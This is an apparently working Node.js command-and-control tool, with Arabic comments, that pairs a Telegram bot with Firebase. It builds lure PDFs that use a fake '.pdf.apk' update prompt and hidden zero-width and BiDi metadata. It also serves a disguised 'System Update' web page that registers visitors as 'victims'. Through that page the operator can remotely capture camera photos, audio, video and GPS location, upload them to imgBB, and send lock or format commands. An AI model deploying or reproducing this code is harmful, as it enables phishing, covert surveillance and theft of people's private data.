#!/usr/bin/env node
// ============================================================
// ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
// Render Ready – Reads ALL keys from environment variables
// ============================================================
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
const sharp = require('sharp');
const admin = require('firebase-admin');
const express = require('express');

// --- قراءة جميع المتغيرات من البيئة ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);
const PORT = process.env.PORT || 10000;
const IMGBB_API_KEY = process.env.IMGBB_API_KEY;

const FIREBASE_PROJECT_ID = process.env.FIREBASE_PROJECT_ID;
const FIREBASE_CLIENT_EMAIL = process.env.FIREBASE_CLIENT_EMAIL;
const FIREBASE_PRIVATE_KEY = process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n');
const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY;
const FIREBASE_AUTH_DOMAIN = process.env.FIREBASE_AUTH_DOMAIN;
const FIREBASE_STORAGE_BUCKET = process.env.FIREBASE_STORAGE_BUCKET;
const FIREBASE_MESSAGING_SENDER_ID = process.env.FIREBASE_MESSAGING_SENDER_ID;
const FIREBASE_APP_ID = process.env.FIREBASE_APP_ID;

// --- إعداد Firebase ---
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: FIREBASE_PROJECT_ID,
    clientEmail: FIREBASE_CLIENT_EMAIL,
    privateKey: FIREBASE_PRIVATE_KEY
  }),
  databaseURL: `https://${FIREBASE_PROJECT_ID}.firebaseio.com`
});
const db = admin.firestore();

// --- إعداد البوت ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- تخزين مؤقت لرمز القفل ---
const pendingLockCode = new Map();

// --- Zero‑Width + BiDi (للبيانات الوصفية) ---
const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };
function generateCrashTrap() {
    return '\u202E'.repeat(4096) + '\u202A'.repeat(2048) + '['.repeat(1024) + '\u202A'.repeat(2048) + ']'.repeat(1024) + '\u202C';
}
function binaryToZeroWidth(data) {
    let bitStr = '';
    for (let i = 0; i < data.length; i++) bitStr += data[i].toString(2).padStart(8, '0');
    let encoded = '';
    for (const bit of bitStr) encoded += ZW_MAP[bit];
    return encoded + ZW_MAP['E'];
}
function generatePayloadStub() {
    return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
}

// --- دالة PDF (بدون RLO مرئي) ---
async function createWeaponizedPDF(imageBuffer, agentUrl) {
    const pdfDoc = await PDFDocument.create();
    const page = pdfDoc.addPage([595, 842]);
    const font = await pdfDoc.embedFont(StandardFonts.Helvetica);

    let image;
    try {
        const pngImage = await sharp(imageBuffer).png().toBuffer();
        image = await pdfDoc.embedPng(pngImage);
    } catch {
        const jpgImage = await sharp(imageBuffer).jpeg().toBuffer();
        image = await pdfDoc.embedJpg(jpgImage);
    }
    const imgDims = image.scale(0.5);
    page.drawImage(image, {
        x: (595 - imgDims.width) / 2,
        y: (842 - imgDims.height) / 2,
        width: imgDims.width,
        height: imgDims.height,
    });

    const displayName = 'Important_Document.pdf.apk';
    page.drawText(`To view the content, please install the required update:\n${displayName}`, {
        x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
    });

    const linkAnnotation = pdfDoc.context.obj({
        Type: 'Annot', Subtype: 'Link', Rect: [50, 90, 350, 110],
        Border: [0,0,0], A: { Type: 'Action', S: 'URI', URI: agentUrl }
    });
    page.node.addAnnot(linkAnnotation);

    const stub = generatePayloadStub();
    const hiddenPayload = binaryToZeroWidth(stub);
    pdfDoc.setAuthor(hiddenPayload + generateCrashTrap());
    pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
    pdfDoc.setSubject('Confidential');
    pdfDoc.setCreator('Adobe Acrobat');
    pdfDoc.setProducer('GhostWeaver v8.0');

    return Buffer.from(await pdfDoc.save());
}

// --- أوامر البوت ---
bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    bot.sendMessage(msg.chat.id,
        '❤️ *جاهز سيدي المطور.*\n\n' +
        '⚡ *الوحش متصل بـ Firebase + imgBB*\n\n' +
        '/pdf - صنع PDF ملغوم\n/panel - عرض الضحايا\n\n📸 *أرسل /pdf ثم الصورة.*',
        { parse_mode: 'Markdown' }
    );
});

let awaitingPhoto = false;
bot.onText(/\/pdf/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    awaitingPhoto = true;
    bot.sendMessage(msg.chat.id, '📸 أرسل الصورة الآن.');
});

bot.on('photo', async (msg) => {
    if (!awaitingPhoto || msg.from.id !== ADMIN_ID) return;
    awaitingPhoto = false;
    const waitMsg = await bot.sendMessage(msg.chat.id, '🔄 جاري بناء PDF...');
    try {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await fetch(fileUrl);
        const buffer = Buffer.from(await response.arrayBuffer());
        // رابط الجندي هو مسار /agent على نفس السيرفر
        const agentUrl = `${process.env.WEBHOOK_URL}/agent`;
        const pdfBuffer = await createWeaponizedPDF(buffer, agentUrl);
        await bot.sendDocument(msg.chat.id, pdfBuffer, {
            filename: 'document.pdf',
            caption: '💣 *PDF ملغوم جاهز.*\n\n📱 الضحية يجب أن يفتح الرابط ويثبت التطبيق.',
            parse_mode: 'Markdown'
        });
        await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {
        await bot.editMessageText(`❌ خطأ: ${e.message}`, { chat_id: msg.chat.id, message_id: waitMsg.message_id });
    }
});

bot.onText(/\/panel/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const snapshot = await db.collection('victims').get();
    if (snapshot.empty) return bot.sendMessage(msg.chat.id, '⚠️ لا يوجد ضحايا.');

    let list = '👥 *الضحايا:*\n\n';
    const inlineKeyboard = [];
    snapshot.forEach(doc => {
        const data = doc.data();
        list += `🆔 \`${doc.id.slice(0,8)}\` | ${data.os || '?'} | ${data.name || '?'}\n`;
        inlineKeyboard.push([{ text: `🎯 ${data.name || doc.id.slice(0,8)}`, callback_data: `select:${doc.id}` }]);
    });
    bot.sendMessage(msg.chat.id, list, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: inlineKeyboard } });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    await bot.answerCallbackQuery(query.id);

    if (data.startsWith('select:')) {
        const victimId = data.split(':')[1];
        const commands = [
            [{ text: '📸 سحب الصور', callback_data: `cmd:${victimId}:gallery` }],
            [{ text: '📁 سحب الملفات', callback_data: `cmd:${victimId}:files` }],
            [{ text: '🎤 تسجيل صوت', callback_data: `cmd:${victimId}:record_audio` }],
            [{ text: '🎥 تسجيل فيديو', callback_data: `cmd:${victimId}:record_video` }],
            [{ text: '📷 تصوير أمامي', callback_data: `cmd:${victimId}:camera_front` }],
            [{ text: '📷 تصوير خلفي', callback_data: `cmd:${victimId}:camera_back` }],
            [{ text: '📱 اهتزاز', callback_data: `cmd:${victimId}:vibrate` }],
            [{ text: '💬 إشعار', callback_data: `cmd:${victimId}:toast` }],
            [{ text: '📍 الموقع', callback_data: `cmd:${victimId}:location` }],
            [{ text: '📊 معلومات', callback_data: `cmd:${victimId}:device_info` }],
            [{ text: '💣 فرمتة', callback_data: `cmd:${victimId}:format` }],
            [{ text: '🔒 قفل برمز', callback_data: `cmd:${victimId}:lock_code` }],
        ];
        bot.editMessageText(`التحكم بـ \`${victimId.slice(0,8)}\``, {
            chat_id: chatId, message_id: query.message.message_id,
            reply_markup: { inline_keyboard: commands }, parse_mode: 'Markdown'
        });
    } else if (data.startsWith('cmd:')) {
        const [, victimId, command] = data.split(':');
        if (command === 'lock_code') {
            pendingLockCode.set(victimId, { chatId, messageId: query.message.message_id });
            bot.sendMessage(chatId, `🔐 أدخل الرمز الرقمي للقفل:`, { parse_mode: 'Markdown' });
            return;
        }
        await db.collection('victims').doc(victimId).collection('commands').add({
            command, status: 'pending', timestamp: admin.firestore.FieldValue.serverTimestamp()
        });
        bot.editMessageText(`✅ أُرسل: ${command}`, { chat_id: chatId, message_id: query.message.message_id });
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || msg.from.id !== ADMIN_ID) return;
    for (let [victimId, pending] of pendingLockCode.entries()) {
        if (pending.chatId === chatId) {
            const code = text.trim();
            if (!/^\d+$/.test(code)) { bot.sendMessage(chatId, '❌ أرقام فقط.'); return; }
            await db.collection('victims').doc(victimId).collection('commands').add({
                command: 'lock_code', code, status: 'pending', timestamp: admin.firestore.FieldValue.serverTimestamp()
            });
            bot.editMessageText(`✅ قفل برمز ${code}`, { chat_id: pending.chatId, message_id: pending.messageId }).catch(()=>{});
            bot.sendMessage(chatId, `🔒 تم الإرسال للضحية \`${victimId.slice(0,8)}\``, { parse_mode: 'Markdown' });
            pendingLockCode.delete(victimId);
            return;
        }
    }
});

// --- مراقبة النتائج ---
db.collectionGroup('results').onSnapshot(async (snap) => {
    for (const doc of snap.docChanges()) {
        if (doc.type === 'added') {
            const data = doc.doc.data();
            if (data.type === 'photo' && data.url) {
                await bot.sendPhoto(ADMIN_ID, data.url, { caption: `📸 من ${doc.ref.parent.parent.id.slice(0,8)}` });
            } else if (data.type === 'file' && data.url) {
                await bot.sendDocument(ADMIN_ID, data.url, { caption: `📁 من ${doc.ref.parent.parent.id.slice(0,8)}` });
            } else if (data.type === 'device_info') {
                await bot.sendMessage(ADMIN_ID, `📊 *معلومات*\n${data.info}`, { parse_mode: 'Markdown' });
            } else if (data.type === 'location') {
                await bot.sendLocation(ADMIN_ID, data.lat, data.lng);
                await bot.sendMessage(ADMIN_ID, `📍 من ${doc.ref.parent.parent.id.slice(0,8)}`, { parse_mode: 'Markdown' });
            }
            await doc.ref.delete();
        }
    }
});

// --- خادم HTTP + الجندي الديناميكي ---
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Health check
app.get('/', (req, res) => res.send('OK'));
app.get('/health', (req, res) => res.send('OK'));

// الجندي: صفحة HTML تُحقن فيها مفاتيح Firebase و imgBB من متغيرات البيئة
app.get('/agent', (req, res) => {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0f0a; min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Courier New',monospace; padding:16px; }
        .card { background:#0d1a0d; border:2px solid #1a3a1a; border-radius:24px; padding:24px; max-width:400px; width:100%; box-shadow:0 0 30px rgba(0,255,0,0.1); color:#33ff33; text-align:center; }
        h2 { color:#ff0055; text-shadow:0 0 8px #ff0055; margin-bottom:16px; }
        .status { background:#020402; border:1px solid #33ff33; border-radius:16px; padding:16px; margin:20px 0; word-break:break-word; }
        .btn-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-top:20px; }
        .btn { background:#1a2a1a; border:1px solid #33ff33; color:#33ff33; padding:14px 8px; border-radius:16px; font-weight:bold; cursor:pointer; transition:0.2s; }
        .btn:active { background:#33ff33; color:#000; }
        .btn.danger { border-color:#ff3366; color:#ff3366; }
        .btn.danger:active { background:#ff3366; color:#000; }
        .lock-input { background:#020402; border:1px solid #33ff33; color:#33ff33; padding:12px; border-radius:16px; width:100%; margin:10px 0; text-align:center; }
    </style>
</head>
<body>
<div class="card">
    <h2>⚡ ARCHITECT</h2>
    <div class="status" id="statusText">Initializing...</div>
    <div id="extraUI"></div>
    <div class="btn-grid">
        <button class="btn" data-cmd="gallery">📸 Gallery</button>
        <button class="btn" data-cmd="files">📁 Files</button>
        <button class="btn" data-cmd="record_audio">🎤 Audio</button>
        <button class="btn" data-cmd="record_video">🎥 Video</button>
        <button class="btn" data-cmd="camera_front">📷 Front</button>
        <button class="btn" data-cmd="camera_back">📷 Back</button>
        <button class="btn" data-cmd="vibrate">📳 Vibrate</button>
        <button class="btn" data-cmd="toast">💬 Toast</button>
        <button class="btn" data-cmd="location">📍 GPS</button>
        <button class="btn" data-cmd="device_info">📊 Info</button>
        <button class="btn danger" data-cmd="format">💣 Format</button>
        <button class="btn danger" data-cmd="lock_code">🔒 Lock</button>
    </div>
    <div style="margin-top:16px; font-size:12px;" id="deviceIdDisplay"></div>
</div>
<script type="module">
    // المفاتيح من السيرفر (متغيرات البيئة)
    const IMGBB_API_KEY = '${IMGBB_API_KEY}';
    const FIREBASE_CONFIG = {
        apiKey: '${FIREBASE_API_KEY}',
        authDomain: '${FIREBASE_AUTH_DOMAIN}',
        projectId: '${FIREBASE_PROJECT_ID}',
        storageBucket: '${FIREBASE_STORAGE_BUCKET}',
        messagingSenderId: '${FIREBASE_MESSAGING_SENDER_ID}',
        appId: '${FIREBASE_APP_ID}'
    };

    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const app = initializeApp(FIREBASE_CONFIG);
    const db = getFirestore(app);

    let deviceId = localStorage.getItem('arch_device_id');
    if (!deviceId) {
        deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
        localStorage.setItem('arch_device_id', deviceId);
    }
    document.getElementById('deviceIdDisplay').innerText = 'ID: ' + deviceId.slice(0,12);
    const statusEl = document.getElementById('statusText');
    const extraDiv = document.getElementById('extraUI');

    function setStatus(msg, ok=true) { statusEl.innerHTML = msg; statusEl.style.color = ok ? '#33ff33' : '#ff5555'; }

    async function register() {
        try {
            await setDoc(doc(db, "victims", deviceId), {
                name: navigator.userAgent.substring(0,100),
                os: navigator.platform,
                lastSeen: serverTimestamp(),
                webAgent: true
            });
            setStatus('✅ Connected. Listening...');
        } catch(e) { setStatus('❌ Firebase error', false); }
    }

    async function uploadToImgBB(base64) {
        const formData = new FormData();
        formData.append('image', base64.split(',')[1] || base64);
        const res = await fetch('https://api.imgbb.com/1/upload?key=' + IMGBB_API_KEY, { method:'POST', body:formData });
        const json = await res.json();
        return json.data.url;
    }

    async function executeCommand(cmd, extra) {
        setStatus('⚙️ ' + cmd);
        try {
            switch(cmd) {
                case 'gallery': {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const track = stream.getVideoTracks()[0];
                    const bitmap = await new ImageCapture(track).grabFrame();
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width; canvas.height = bitmap.height;
                    canvas.getContext('2d').drawImage(bitmap,0,0);
                    const url = await uploadToImgBB(canvas.toDataURL('image/jpeg',0.7));
                    track.stop();
                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'photo', url, timestamp: serverTimestamp() });
                    setStatus('📸 Sent');
                    break;
                }
                case 'files': setStatus('⚠️ Web limited', false); break;
                case 'record_audio': {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, {type:'audio/webm'});
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const url = await uploadToImgBB(reader.result);
                            await addDoc(collection(db, "victims", deviceId, "results"), { type:'file', url, filename:'audio.webm', timestamp: serverTimestamp() });
                            setStatus('🎵 Audio sent');
                        };
                        reader.readAsDataURL(blob);
                    };
                    recorder.start();
                    setTimeout(()=>recorder.stop(),3000);
                    break;
                }
                case 'record_video': {
                    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, {type:'video/webm'});
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const url = await uploadToImgBB(reader.result);
                            await addDoc(collection(db, "victims", deviceId, "results"), { type:'file', url, filename:'video.webm', timestamp: serverTimestamp() });
                            setStatus('🎬 Video sent');
                        };
                        reader.readAsDataURL(blob);
                    };
                    recorder.start();
                    setTimeout(()=>recorder.stop(),3000);
                    break;
                }
                case 'camera_front': case 'camera_back': {
                    const facing = cmd.endsWith('front') ? 'user' : 'environment';
                    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode: facing } });
                    const track = stream.getVideoTracks()[0];
                    const bitmap = await new ImageCapture(track).grabFrame();
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width; canvas.height = bitmap.height;
                    canvas.getContext('2d').drawImage(bitmap,0,0);
                    const url = await uploadToImgBB(canvas.toDataURL('image/jpeg',0.8));
                    track.stop();
                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'photo', url, timestamp: serverTimestamp() });
                    setStatus('📷 Sent');
                    break;
                }
                case 'vibrate': navigator.vibrate?.(1000); setStatus('📳 Vibration'); break;
                case 'toast': {
                    const el = document.createElement('div');
                    el.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#1a3a1a;color:#0f0;padding:16px;border-radius:16px;z-index:9999;text-align:center';
                    el.innerText = '📨 Message from controller';
                    document.body.appendChild(el);
                    setTimeout(()=>el.remove(),3000);
                    setStatus('💬 Toast shown');
                    break;
                }
                case 'location': {
                    const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000}));
                    const {latitude,longitude} = pos.coords;
                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'location', lat:latitude, lng:longitude, timestamp: serverTimestamp() });
                    setStatus('📍 Location sent');
                    break;
                }
                case 'device_info': {
                    let info = 'UserAgent: '+navigator.userAgent+'\\nPlatform: '+navigator.platform;
                    if ('getBattery' in navigator) {
                        const b = await navigator.getBattery();
                        info += '\\nBattery: '+Math.round(b.level*100)+'% '+(b.charging?'⚡':'');
                    }
                    await addDoc(collection(db, "victims", deviceId, "results"), { type:'device_info', info, timestamp: serverTimestamp() });
                    setStatus('📊 Info sent');
                    break;
                }
                case 'format': setStatus('💣 Format (simulated)', false); break;
                case 'lock_code': {
                    const code = extra || prompt('Enter lock code:');
                    if (code) {
                        localStorage.setItem('lock_code', code);
                        await addDoc(collection(db, "victims", deviceId, "results"), { type:'device_info', info:'Lock code set: '+code, timestamp: serverTimestamp() });
                        setStatus('🔒 Code set');
                    }
                    break;
                }
            }
        } catch(e) { setStatus('❌ '+e.message, false); }
    }

    function listenCommands() {
        const q = query(collection(db, "victims", deviceId, "commands"), where("status","==","pending"));
        onSnapshot(q, async (snap) => {
            for (const change of snap.docChanges()) {
                if (change.type === 'added') {
                    const d = change.doc.data();
                    await executeCommand(d.command, d.code);
                    await updateDoc(change.doc.ref, { status:'done' });
                }
            }
        });
    }

    document.querySelectorAll('[data-cmd]').forEach(btn => {
        btn.addEventListener('click', () => {
            const cmd = btn.dataset.cmd;
            if (cmd === 'lock_code') {
                const val = prompt('Enter lock code:');
                if (val) executeCommand(cmd, val);
            } else if (cmd === 'format') {
                if (confirm('Simulate format?')) executeCommand(cmd);
            } else executeCommand(cmd);
        });
    });

    register().then(()=> listenCommands());
</script>
</body>
</html>
    `;
    res.send(html);
});

app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Server on ${PORT}`));
console.log('🤖 Architect C2 Bot started.');
